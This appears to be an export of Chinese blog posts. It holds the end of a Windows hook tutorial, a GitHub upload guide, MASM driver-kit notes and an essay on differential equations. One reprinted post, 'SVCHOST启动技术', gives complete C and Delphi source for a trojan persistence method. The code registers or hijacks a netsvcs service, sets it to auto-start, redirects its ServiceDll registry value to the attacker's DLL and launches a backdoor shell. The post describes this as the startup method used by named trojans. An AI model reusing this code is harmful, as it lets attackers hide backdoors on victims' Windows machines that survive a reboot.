style;LPCSTR lpszName;LPCSTR lpszClass;DWORD dwExStyle;&#125; CREATESTRUCTA, *LPCREATESTRUCTA; HCBT_DESTROYWND，窗口解构中，但WM_DESTROY消息还没有发出，可以通过返回TRUE来阻止窗口解构。参数wParam是窗口的句柄，lParam为0L。 HCBT_MINMAX最大最小化时引发，返回TRUE可以禁止动作。参数wParam是窗口的句柄，lParam是一个ShowWindow常数SW_*值： 1234567891011121314#define SW_HIDE 0#define SW_SHOWNORMAL 1#define SW_NORMAL 1#define SW_SHOWMINIMIZED2#define SW_SHOWMAXIMIZED3#define SW_MAXIMIZE 3#define SW_SHOWNOACTIVATE 4#define SW_SHOW 5#define SW_MINIMIZE 6#define SW_SHOWMINNOACTIVE 7#define SW_SHOWNA 8#define SW_RESTORE 9#define SW_SHOWDEFAULT 10#define SW_MAX 10 HCBT_MOVESIZE，移动或调整窗口大小时引发，返回TRUE可以禁止动作。参数wParam是窗口的句柄，lParam是一个矩形RECT结构体指针，文章开始处已经出现过。 HCBT_SYSCOMMAND，系统菜单命令，即左上角的弹出菜单引发，返回TRUE可以禁止系统菜单弹出。WH_CBT钩子是由DefWindowsProc过程调用的，如果没有发送WH_SYSCOMMAND过来，就不会有这个钩子的调用。参数wParam包含即将执行行的系统命令，即鼠标划过的菜单项，lParam的低位字和高位字存放鼠标的xy坐标。如果wParam是SC_HOTKEY，那么lParam就包含热键适用的窗口句柄。其它系统命令列表如下： 1234567891011121314151617181920#define SC_SIZE 0xF000 // 调整窗口大小#define SC_MOVE 0xF010 // 移动窗口位置#define SC_MINIMIZE 0xF020 // 最小化窗口#define SC_MAXIMIZE 0xF030 // 最大化窗口#define SC_NEXTWINDOW 0xF040 // 下一个窗口#define SC_PREVWINDOW 0xF050 // 上一个窗口#define SC_CLOSE0xF060 // 关闭命令#define SC_VSCROLL 0xF070 // 垂直滚动#define SC_HSCROLL 0xF080 // 水平滚动#define SC_MOUSEMENU0xF090 // 通过鼠标单击获取菜单#define SC_KEYMENU 0xF100 // 通过按键获取菜单#define SC_ARRANGE 0xF110#define SC_RESTORE 0xF120 // 还原窗口位置状态#define SC_TASKLIST 0xF130 // 执行或激活任务管理程序#define SC_SCREENSAVE 0xF140 // 执行屏保程序#define SC_HOTKEY 0xF150#define SC_DEFAULT 0xF160#define SC_MONITORPOWER 0xF170#define SC_CONTEXTHELP 0xF180#define SC_SEPARATOR0xF00F HCBT_SETFOCUS，当窗口激活就要取得焦点时引起，可以通过返回TRUE来阻止窗口取得焦点。参数wParam有窗口的句柄，lParam失去焦点的窗口句柄。 HCBT_QS，当移动或调整窗口大小过程中，一个WM_QUEUESYNC消息从系统队列移除时引起，其它任何情况不会发生。参数wParam和lParam都为0。 HCBT_CLICKSKIPPED，当鼠标事件要从队列移除时引发，也就是说这个鼠标事件是无效的，通常是日志钩子回放时引起的。wParam包含鼠标事的类型，如WM_LBUTTONDOWN，lParam包含一个结构体的指针： 123456typedef struct tagMOUSEHOOKSTRUCT &#123;POINT pt; // Location of mouse in screen coordinatesHWND hwnd; // Window that receives this messageUINT wHitTestCode; // The result of hit-testing (HT_*)DWORD dwExtraInfo;// Extra info associated with the current message&#125; MOUSEHOOKSTRUCT, FAR *LPMOUSEHOOKSTRUCT, *PMOUSEHOOKSTRUCT; HCBT_KEYSKIPPED，和前者一样，路过或从队列中移除消息都会引发。wParam包含虚拟键值，lParam包含其它属性，和消息环的键盘事件消息一样。 WM_QUEUESYNC，CBT编程通常都要响应主程序的这些键盘和鼠标事件，例如，在确定一个对话框后，CBT程序可能会要向主程序输入几个字符。通过鼠标钩子可以用来确定有没有按下OK按钮，根据结果来决定要输入哪些字符到主程序， 这样CBT程序就要等到按下OK按钮后的过程处理完成后。那么CBT程序就可以通过WM_QUEUESYNC消息来监视主程序，看看动作何时完成，下面是两个判断步骤： CBT程序等待直到收到WH_CBT钩子，带 HCBT_CLICKSKIPPED 或 HCBT_KEYSKIPPED 代码的钩子。这会在主程序把消息从系统队列中移除时发生。当CBT安装回放钩子时，直到收到HCBT_CLICKSKIPPED 或 HCBT_KEYSKIPPED 代码才能安装成功。回放钩子发送WM_QUEUESYNC消息给CBT程序，CBT程序可以响应这个事件，比如说输入一些字符到主程序。 参考资料 123456789101112131415Visual Studio MSDN Library 6.0 SPY Code SampleWin32 Hooks -MSDN 99, Kyle Marsh July 29, 1993Using Hooks, MSDN: http://msdn.microsoft.com/en-us/library/ms644960%28v=vs.85%29.aspx&quot;Load Your 32-bit DLL into Another Process&#x27;s Address Space Using INJLIB&quot; Jeffrey Ritcher, MSJ May 1994&quot;An In-Depth Look into the Win32 PE file format&quot; , part 1, Matt Pietrek, MSJ February 2002&quot;An In-Depth Look into the Win32 PE file format&quot; , part 2, Matt Pietrek, MSJ March 2002DLLs in Win32 by Randy Kath，MSDN September 15, 1992DLLs for Beginners by Debabrata Sarma，MSDN 1996Advanced Windows NT, The Developer&#x27;s Guide to the Win32 Application Programming Interface by J. RichterDetecting Windows NT/2K process execution: http://www.codeproject.com/Articles/2018/Detecting-Windows-NT-2K-process-executionAPI hooking revealed: http://www.codeproject.com/Articles/2082/API-hooking-revealedAPI Hook完全手册 : http://blog.csdn.net/ATField/article/details/1507122让EXE导出函数，看雪论坛: http://bbs.pediy.com/showthread.php?t=56840如何与应用程序或其他 DLL 共享自己 DLL 中的数据？: http://msdn.microsoft.com/zh-cn/library/h90dkhs0DLL导出变量: http://blog.csdn.net/henry000/article/details/6852521 修改文件的IMAGE_NT_HEADERS.FileHeader.Characteristics为IMAGE_FILE_DLL。 版权声明：自由转载-非商用-非衍生-保持署名 | Creative Commons BY-NC-ND 3.0 ByNo CommercialNo Derived 建档时间：2013年11月15日修改时间：2013年11月22日 ———————————————— 版权声明：本文为CSDN博主「Jimbo」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/winsenjiansbomber/article/details/16891189","tags":"reprint windows-hook"},{"title":"如何将本地项目上传到Github","url":"/20191202/ru-he-jiang-ben-di-xiang-mu-shang-chuan-dao-github/","text":"Reprint from https://www.cnblogs.com/smfx1314/p/8426115.html 使用git上传文件到GitHub需要git客户端以及注册GitHub账号。 git官网:https://git-scm.com/ github官网:https://github.com/ 下面是具体的操作步骤： 第一步：我们需要先创建一个本地的版本库（其实也就是一个文件夹）。你可以直接在桌面右击新建文件夹，也可以右击打开Git bash命令行窗口通过命令来创建。现在我通过命令行在桌面新建一个test文件夹（你也可以在其他任何地方创建这个文件夹），并且进入这个文件夹 第二步： 在命令行中输入git init把这个文件夹变成Git可管理的仓库.这时你会发现test里面多了个.git文件夹，它是Git用来跟踪和管理版本库的，因为它默认是隐藏文件，要是看不到就设置下文件夹和搜索选项。 之后把需要上传到GitHub的文件全部复制到这test这个目录下。 然后通过git add .(注意这个&quot;.“，是有空格的，”.&quot;代表这个test这个文件夹下的目录全部都提交。你也可以通过git add 文件名 提交指定的文件)把文件添加到缓存区或者指定具体文件提交. 然后可以通过git status命令，查看下现在的状态.看到有css,js文件夹的内容都提交上去了。 然后，在使用命令git commit -m “这里面写你的注释” 把文件提交的本地仓库 第三步：下面就到了连接远程仓库（也就是连接Github） 由于本地Git仓库和Github仓库之间的传输是通过SSH加密的，所以连接时需要设置一下：创建SSH KEY。先看一下你C盘用户目录下有没有.ssh目录，有的话看下里面有没有id_rsa和id_rsa.pub这两个文件，有就跳到下一步，没有就通过下面命令创建 然后一路回车。这时你就会在用户下的.ssh目录里找到id_rsa和id_rsa.pub这两个文件 1$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 第四步：登录Github,找到右上角的图标，打开点进里面的Settings，再选中里面的SSH and GPG KEYS，点击右上角的New SSH key，然后Title里面随便填，再把刚才id_rsa.pub里面的内容复制到Title下面的Key内容框里面，最后点击Add SSH key，这样就完成了SSH Key的加密。 第五步：在Github上创建一个Git仓库。你可以直接点New repository来创建，比如我创建了一个tes2t的仓库。 第六步：在Github上创建好Git仓库之后我们就可以和本地仓库进行关联了，根据创建好的Git仓库页面的提示，可以在本地test仓库的命令行输入： 1$ git remote add origin git@github.com:smfx1314/test2.git 第七步：关联好之后我们就可以把本地库的所有内容推送到远程仓库（也就是Github）上了，通过： 1$ git push -u origin master 由于新建的远程仓库是空的，所以要加上-u这个参数。然后进去GitHub test2这个仓库刷新下就会有已经上传的文件夹了。如果新建远程仓库不是空的，例如你勾选了 Initialize this repository with a README。那么你通过命令 $ git push -u origin master是会报错的,这是由于你新创建的那个仓库里面的README文件不在本地仓库目录中，这时我们可以通过以下命令先将内容合并以下： 1$ git pull --rebase origin master 再输入 1$ git push origin master 等远程仓库里面有了内容之后，下次再从本地库上传内容的时候只需下面这样就可以了： 1$ git push origin master 至此就完成了将本地项目上传到Github的整个过程。","tags":"reprint github"},{"title":"SVCHOST启动技术","url":"/20191201/svchost-qi-dong-ji-zhu/","text":"转自邪恶八进制信息安全团队 SVCHOST启动技术文章作者：dream2fly.net说明：大部门代码来自bingle的文章，感谢bingle，并加入装载自启动代码//感谢使用，幻影光临白帽子实验室http://www.dream2fly.net/forumCode Language : C//Service HANDLE &amp; STATUS used to get service stateSERVICE_STATUS_HANDLE hSrv;DWORD dwCurrState;//report service stat to the service control managerint TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );//RealService just create a process dream2fly.netint ControlService(DWORD dwCommand)&#123; char cmd[MAX_PATH] = &#123;0&#125;; if (dwCommand == SERVICE_CONTROL_CONTINUE) &#123; strcpy(cmd, &quot;net start &quot;); &#125; else if(dwCommand == SERVICE_CONTROL_STOP) &#123; strcpy(cmd, &quot;net stop &quot;); &#125; strcat(cmd, stServiceCfg.szSvcName); PROCESS_INFORMATION pi; STARTUPINFO si; memset(&amp;si,0,sizeof(si)); si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES; si.wShowWindow=SW_HIDE; if(!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)) OutputString(&quot;SvcHostDLL: CreateProcess(%s) error:%d&quot;, cmd, GetLastError()); else OutputString(&quot;SvcHostDLL: CreateProcess(%s) to %d&quot;, cmd, pi.dwProcessId); return 0;&#125;int ReplaceService()&#123; int rc = 0; HKEY hKey = 0; try&#123; char buff[500]; //query svchost setting char *ptr, *pSvchost = &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost&quot;; rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_QUERY_VALUE, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.&quot;, pSvchost, rc); throw &quot;&quot;; &#125; DWORD type, size = sizeof buff; rc = RegQueryValueEx(hKey, &quot;netsvcs&quot;, 0, &amp;type, (unsigned char*)buff, &amp;size); RegCloseKey(hKey); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegQueryValueEx(Svchost\\\\netsvcs)&quot;; for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1) if(stricmp(ptr, stServiceCfg.szSvcName) == 0) break; if(*ptr == 0) &#123; OutputString(&quot;you specify service name not in Svchost\\\\netsvcs, must be one of following:&quot;); for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1) OutputString(&quot; - %s&quot;, ptr); throw &quot;&quot;; &#125; //config service strncpy(buff, &quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\&quot;, sizeof buff); strcat(buff, stServiceCfg.szSvcName); rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, buff, 0, KEY_ALL_ACCESS, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;, stServiceCfg.szSvcName, rc); throw &quot;&quot;; &#125; DWORD dwValue = 2;//auto start rc = RegSetValueEx(hKey, &quot;Start&quot;, 0, REG_DWORD, (unsigned char*)&amp;dwValue, sizeof(DWORD)); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegSetValueEx(start)&quot;; //////////////////// char szDllPath[MAX_PATH] = &#123;0&#125;; if(!GetModuleFileName(HMODULE(hDll), szDllPath, sizeof szDllPath)) throw &quot;GetModuleFileName() get dll path&quot;; LogToFile(szDllPath, GetLastError()); strcat(buff, &quot;\\\\Parameters&quot;); rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, buff, 0, KEY_ALL_ACCESS, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;, stServiceCfg.szSvcName, rc); throw &quot;&quot;; &#125; rc = RegSetValueEx(hKey, &quot;ServiceDll&quot;, 0, REG_EXPAND_SZ, (unsigned char*)szDllPath, strlen(szDllPath)+1); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegSetValueEx(ServiceDll)&quot;; OutputString(&quot;Config service %s ok.&quot;, stServiceCfg.szSvcName); &#125; catch(char *str) &#123; if(str &amp;&amp; str[0]) &#123; rc = GetLastError(); OutputString(&quot;%s error %d&quot;, str, rc); &#125; &#125; RegCloseKey(hKey); //启动服务 ControlService(SERVICE_CONTROL_CONTINUE); return 0;&#125;int RecoverService()&#123; int rc = 0; HKEY hKey = 0; try&#123; LogToFile(&quot;RecoverService&quot;); char buff[500]; //config service strncpy(buff, &quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\&quot;, sizeof buff); strcat(buff, stServiceCfg.szSvcName); rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, buff, 0, KEY_ALL_ACCESS, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;, stServiceCfg.szSvcName, rc); throw &quot;&quot;; &#125; LogToFile(&quot;RegSetValueEx&quot;); DWORD dwValue = 3;//manule start rc = RegSetValueEx(hKey, &quot;Start&quot;, 0, REG_DWORD, (unsigned char*)&amp;dwValue, sizeof(DWORD)); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegSetValueEx(start)&quot;; //////////////////// char szDllPath[MAX_PATH] = &#123;0&#125;; strcpy(szDllPath, &quot;%SystemRoot%\\\\System32\\\\qmgr.dll&quot;); strcat(buff, &quot;\\\\Parameters&quot;); rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, buff, 0, KEY_ALL_ACCESS, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;, stServiceCfg.szSvcName, rc); throw &quot;&quot;; &#125; rc = RegSetValueEx(hKey, &quot;ServiceDll&quot;, 0, REG_EXPAND_SZ, (unsigned char*)szDllPath, strlen(szDllPath)+1); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegSetValueEx(ServiceDll)&quot;; OutputString(&quot;RecoverService(%s) SUCCESS.&quot;, stServiceCfg.szSvcName); &#125; catch(char *str) &#123; if(str &amp;&amp; str[0]) &#123; LogToFile(str); rc = GetLastError(); OutputString(&quot;%s error %d&quot;, str, rc); &#125; &#125; RegCloseKey(hKey); //说明：大部门代码来自bingle的文章，感谢bingle，并加入装载自启动代码//感谢使用，幻影光临白帽子实验室http://www.dream2fly.net/forum ControlService(SERVICE_CONTROL_STOP); return 0;&#125; BOOL InstallService()&#123; // Open a handle to the SC Manager database. int rc = 0; HKEY hKey, hkParam = 0; SC_HANDLE hscm = NULL, schService = NULL; try&#123; char buff[500]; //query svchost setting char *ptr, *pSvchost = &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost&quot;; rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_QUERY_VALUE, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.&quot;, pSvchost, rc); throw &quot;&quot;; &#125; DWORD type, size = sizeof buff; rc = RegQueryValueEx(hKey, &quot;netsvcs&quot;, 0, &amp;type, (unsigned char*)buff, &amp;size); RegCloseKey(hKey); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegQueryValueEx(Svchost\\\\netsvcs)&quot;; for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1) if(stricmp(ptr, stServiceCfg.szSvcName) == 0) break; if(*ptr == 0) &#123; OutputString(&quot;you specify service name not in Svchost\\\\netsvcs, must be one of following:&quot;); for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1) OutputString(&quot; - %s&quot;, ptr); throw &quot;&quot;; &#125; //create service hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (hscm == NULL) throw &quot;OpenSCManager()&quot;; char *bin = &quot;%SystemRoot%\\\\system32\\\\svchost.exe -k netsvcs&quot;; schService = CreateService( hscm, // SCManager database stServiceCfg.szSvcName, // name of service stServiceCfg.szSvcName, // service name to display SERVICE_ALL_ACCESS, // desired access SERVICE_WIN32_SHARE_PROCESS, // service type SERVICE_AUTO_START, // start type SERVICE_ERROR_NORMAL, // error control type bin, // service&#x27;s binary NULL, // no load ordering group NULL, // no tag identifier NULL, // no dependencies NULL, // LocalSystem account NULL); // no password if (schService == NULL) &#123; OutputString(&quot;CreateService(%s) error %d&quot;, stServiceCfg.szSvcName, rc = GetLastError()); throw &quot;&quot;; &#125; OutputString(&quot;CreateService(%s) SUCCESS. Config it path %s&quot;, stServiceCfg.szSvcName, bin); CloseServiceHandle(schService); CloseServiceHandle(hscm); //config service strncpy(buff, &quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\&quot;, sizeof buff); strncat(buff, stServiceCfg.szSvcName, 100); rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, buff, 0, KEY_ALL_ACCESS, &amp;hKey); if(ERROR_SUCCESS != rc) &#123; OutputString(&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;, stServiceCfg.szSvcName, rc); throw &quot;&quot;; &#125; rc = RegCreateKey(hKey, &quot;Parameters&quot;, &amp;hkParam); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegCreateKey(Parameters)&quot;; if(!GetModuleFileName(HMODULE(hDll), buff, sizeof buff)) throw &quot;GetModuleFileName() get dll path&quot;; rc = RegSetValueEx(hkParam, &quot;ServiceDll&quot;, 0, REG_EXPAND_SZ, (unsigned char*)buff, strlen(buff)+1); SetLastError(rc); if(ERROR_SUCCESS != rc) throw &quot;RegSetValueEx(ServiceDll)&quot;; OutputString(&quot;Config service %s ok.&quot;, stServiceCfg.szSvcName); &#125; catch(char *str) &#123; if(str &amp;&amp; str[0]) &#123; rc = GetLastError(); OutputString(&quot;%s error %d&quot;, str, rc); &#125; &#125; RegCloseKey(hKey); RegCloseKey(hkParam); CloseServiceHandle(schService); CloseServiceHandle(hscm); //说明：大部门代码来自bingle的文章，感谢bingle，并加入装载自启动代码//感谢使用，幻影光临白帽子实验室http://www.dream2fly.net/forum //启动服务 ControlService(SERVICE_CONTROL_CONTINUE); return rc;&#125; int UninstallService()&#123; int rc = 0; SC_HANDLE schService; SC_HANDLE hscm; __try&#123; hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (hscm == NULL) &#123; OutputString(&quot;OpenSCManager() error %d&quot;, rc = GetLastError() ); return rc; &#125; schService = OpenService(hscm, stServiceCfg.szSvcName, DELETE); if (schService == NULL) &#123; OutputString(&quot;OpenService(%s) error %d&quot;, stServiceCfg.szSvcName, rc = GetLastError() ); return rc; &#125; if (!DeleteService(schService) ) &#123; OutputString(&quot;OpenService(%s) error %d&quot;, stServiceCfg.szSvcName, rc = GetLastError() ); return rc; &#125; OutputString(&quot;DeleteService(%s) SUCCESS.&quot;, stServiceCfg.szSvcName); &#125; __except(1) &#123; OutputString(&quot;Exception Catched 0x%X&quot;, GetExceptionCode()); &#125; CloseServiceHandle(schService); CloseServiceHandle(hscm); ControlService(SERVICE_CONTROL_STOP); return rc;&#125; void ServiceMain( int argc, wchar_t *argv[])&#123; char svcname[256]; strncpy(svcname, (char*)argv[0], sizeof svcname); //it&#x27;s should be unicode, but if it&#x27;s ansi we do it well wcstombs(svcname, argv[0], sizeof svcname); OutputString(&quot;SvcHostDLL: ServiceMain(%d, %s) called&quot;, argc, svcname); hSrv = RegisterServiceCtrlHandler( svcname, (LPHANDLER_FUNCTION)ServiceHandler ); if( hSrv == NULL ) &#123; OutputString(&quot;SvcHostDLL: RegisterServiceCtrlHandler %S failed&quot;, argv[0]); return; &#125; TellSCM( SERVICE_START_PENDING, 0, 1 ); TellSCM( SERVICE_RUNNING, 0, 0 ); StartShell();//启动后门dream2fly.net OutputString(&quot;SvcHostDLL: ServiceMain done&quot;); return;&#125; int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )&#123; SERVICE_STATUS srvStatus; srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; srvStatus.dwCurrentState = dwCurrState = dwState; srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN; srvStatus.dwWin32ExitCode = dwExitCode; srvStatus.dwServiceSpecificExitCode = 0; srvStatus.dwCheckPoint = dwProgress; srvStatus.dwWaitHint = 3000; return SetServiceStatus( hSrv, &amp;srvStatus );&#125; void __stdcall ServiceHandler( DWORD dwCommand )&#123; // not really necessary because the service stops quickly switch( dwCommand ) &#123; case SERVICE_CONTROL_STOP: TellSCM( SERVICE_STOP_PENDING, 0, 1 ); OutputString(&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_STOP&quot;); Sleep(10); TellSCM( SERVICE_STOPPED, 0, 0 ); break; case SERVICE_CONTROL_PAUSE: TellSCM( SERVICE_PAUSE_PENDING, 0, 1 ); OutputString(&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_PAUSE&quot;); TellSCM( SERVICE_PAUSED, 0, 0 ); break; case SERVICE_CONTROL_CONTINUE: TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 ); OutputString(&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_CONTINUE&quot;); TellSCM( SERVICE_RUNNING, 0, 0 ); break; case SERVICE_CONTROL_INTERROGATE: OutputString(&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_INTERROGATE&quot;); TellSCM( dwCurrState, 0, 0 ); break; case SERVICE_CONTROL_SHUTDOWN: OutputString(&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_SHUTDOWN&quot;); TellSCM( SERVICE_STOPPED, 0, 0 ); break; &#125;&#125; Parsed in 0.156 secondsDelphi版本源代码典型的Svchost启动DLL木马方式,黑洞和小熊都用了这种启动方式....library ServiceDll; uses SysUtils, Classes, winsvc, System, Windows; &#123; 定义全局变量 &#125; var SvcStatsHandle : SERVICE_STATUS_HANDLE; dwCurrState : DWORD; ServiceName : PChar = &#x27;BITS&#x27;; &#123; 调试函数,用于输出调试文本 &#125; procedure OutPutText(CH:PChar); var FileHandle: TextFile; F : Integer; Begin try if not FileExists(&#x27;zztestdll.txt&#x27;) then F := FileCreate(&#x27;zztestdll.txt&#x27;); finally if F &gt; 0 Then FileClose(F); end; AssignFile(FileHandle,&#x27;zztestdll.txt&#x27;); Append(FileHandle); Writeln(FileHandle,CH); Flush(FileHandle); CloseFile(FileHandle); END; procedure DLLEntryPoint(dwReason : DWord); begin case dwReason of DLL_PROCESS_ATTACH: ; DLL_PROCESS_DETACH: ; DLL_THREAD_ATTACH: ; DLL_THREAD_DETACH: ; end; end; function TellSCM(dwState : DWORD ; dwExitCode : DWORD; dwProgress : DWORD ): LongBool; var srvStatus : service_status; BEGIN srvStatus.dwServiceType := SERVICE_WIN32_SHARE_PROCESS; dwCurrState := dwState; srvStatus.dwCurrentState := dwState; srvStatus.dwControlsAccepted := SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_PAUSE_CONTINUE or SERVICE_ACCEPT_SHUTDOWN; srvStatus.dwWin32ExitCode := dwExitCode; srvStatus.dwServiceSpecificExitCode := 0; srvStatus.dwCheckPoint := dwProgress; srvStatus.dwWaitHint := 3000; Result := SetServiceStatus( SvcStatsHandle, srvStatus ); END; PROCEDURE servicehandler(fdwcontrol:integer); STDCALL; BEGIN CASE fdwcontrol OF SERVICE_CONTROL_STOP: BEGIN TellSCM( SERVICE_STOP_PENDING, 0, 1 ); Sleep(10); TellSCM( SERVICE_STOPPED, 0, 0 ); END; SERVICE_CONTROL_PAUSE: BEGIN TellSCM( SERVICE_PAUSE_PENDING, 0, 1 ); TellSCM( SERVICE_PAUSED, 0, 0 ); END; SERVICE_CONTROL_CONTINUE: BEGIN TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 ); TellSCM( SERVICE_RUNNING, 0, 0 ); END; SERVICE_CONTROL_INTERROGATE: TellSCM( dwCurrState, 0, 0 ); SERVICE_CONTROL_SHUTDOWN: TellSCM( SERVICE_STOPPED, 0, 0 ); END; END; procedure ServiceMain(argc : Integer; VAR argv : pchar ); StdCall; begin &#123; try begin if ParamStr(1) &lt;&gt; &#x27;&#x27; then svcname := strNew(PChar(ParamStr(1))) else begin svcname := strAlloc(10 * Sizeof(Char)); svcname := &#x27;none&#x27;; end; OutPutText(svcname); end finally strdispose(svcname); end; &#125; SvcStatsHandle := RegisterServiceCtrlHandler(ServiceName, @servicehandler); IF (SvcStatsHandle = 0) THEN BEGIN OutPutText(&#x27;Error in RegisterServiceCtrlHandler&#x27;); exit; END else begin FreeConsole(); end; TellSCM( SERVICE_START_PENDING, 0, 1 ); TellSCM( SERVICE_RUNNING, 0, 0 ); OutPutText(&#x27;Service is Running&#x27;); while ((dwCurrState &lt;&gt; SERVICE_STOP_PENDING) and (dwCurrState &lt;&gt; SERVICE_STOPPED)) do beginshowmessage(&#x27;实在无聊&#x27;) end; OutPutText(&#x27;Service Exit&#x27;); end; // 导出函数列表 exports ServiceMain; &#123; dll入口点 &#125; begin DllProc := @DLLEntryPoint; end.","tags":"code-snippets reprint"},{"title":"汇编语言win32asm","url":"/20191201/hui-bian-yu-yan-win32asm/","text":"先安装MASM,下载地址为： http://www.win32asm.com.cn/download/masm32v8.exe。 再安装由一个俄罗斯人Four-F开发了一套工具Kmdkit(Kernel Mode Driver Development Kit for MASM32 )，该工具下载地址为： http://www.win32asm.com.cn/download/KmdKit.rar。 Kmdkit只有一个压缩文件，展开后有几个子目录和两个文件install.bat，readme.txt,安装方法很简单，就是： 把\\include\\w2k下的文件拷到 \\masm32\\include 把\\macros\\Strings.mac下的文件拷到\\masm32\\macros 把\\lib\\w2k 下的文件拷到\\masm32\\lib 或者直接运行 install.bat,安装完毕。 安装完成后，就可以用汇编编写驱动了，罗云彬网站有Kmd教程，可以去下下来看看，下载地址是： http://www.win32asm.com.cn/program/KmdTutCn.chm。 这个教程非常详细，把汇编写驱动的很多问题都写得清清楚楚，我用过这个工具写过驱动，我只看了kmd教程就会编了，而Kmdkit中还有很多例子，有所需的驱动框架，很有用的。","tags":"reprint 汇编wasm"},{"title":"关于微分方程","url":"/20191201/guan-yu-wei-fen-fang-cheng/","text":"本帖是在苹果的bbs上看到的，有助于写毕业论文的，可以看看参考。 微分方程系统 科学家常常自称在探索大自然的奥秘，当获得一定的成功后，他们惊喜地宣布：“瞧，我找到了!” 科学家找到了什么?找到了打开自然之门的钥匙，他们发现了大自然的组织奥秘，知道世界 原来就是这般运行的。 在一般意义上说，这样理解不算错误，但是在哲学意义上，这种看法是有问题的，至少显得 有些狂妄。人与自然的关系无论从对象的意义上看，还是从包含意义上看，都是复杂的，人 类理解自然任何时候都一定是不全面的。人类的所有知识系统的总和如果与大自然相比的话 ，仍然渺小得很。人们任何时候都不能得意地宣称自己完全理解了大自然的运行，找到了一 切规律。 科学不是一天一天在进步吗?依靠科学人类不是取得了一个又一个辉煌技术成就吗?难道人类 理智的进化不具有坚实的标准吗? 令人眼花缭乱的千奇百怪的技术通常让人们感觉人类太伟大了，今日的社会真正飞速发展， 比以往任何时候发展得都快；人类是万物之灵，只有人类理解了自然的语言，知道大自然的 规律。其实这是一种错觉，人类只是一个物种，今日社会与昨日社会甚至原始社会发展步调 没什么两样，人类的自然生存能力不但没有发展，而且逐日下降。动物、植物也理解大自然 的语言，如果说真的有什么语言的话，而且它们理解得也许并不比我们差。 人是自然界的一部分，是自然演化链条中某个环节的产物，所以人与自然有相通、统一的一 面，但人认识自然所达到的知识系统本身不是自然的全部，只是对大自然拙劣的摹仿。在认 识框架中，人——自然——模型总是以三角关系存在的。模型有许多种，不同人也使用不同 的模型，科学家所使用的模型一般有严格的定义，互相之间可以理解。 从数学角度最一般地看问题，迄今为止科学家使用的模型分两大类，一类是只与时间演化 有关的模型，另一类是除了时间外还与空间变化有关的模型。前者叫拉格朗日型模型 (Lagrangian models)，后者叫欧拉型模型(Eulerian models)。模型也就是函数，因而前者 可简单表示为f(t),后者可简单表示为f(x,t)，其中 t代表时间，x代表空间。 在拉格朗日型模型中，只有时间t是独立变量，这类模型主要包括常微分方程 (ordinary differential equations,简记ODE)和差分方程(difference equations，简记 DE)，后者也叫映射。此外还有格子映射(lattice maps,简记为LM)。用整数m和n 表示维数(方程式的个数)，R记连续欧氏空间，Z记实整数,t代 表时间，x(t)代表模型(时间的函数)。当t∈R,x (t)∈R^n时，有常微分方程。当t∈Z,x (t)∈R^n时，有差分方程。当t∈Z,x( t)∈Zn时，有格子映射。显然，至少还有一种重要的逻辑可能性，即t∈R,x(t)∈Zn，暂且叫它突变模型 (catastrophe models)。突变模型是很有价值的，它代表时间连续变化，但物理量却离散变 化的类型，比如地震就是这种情况。 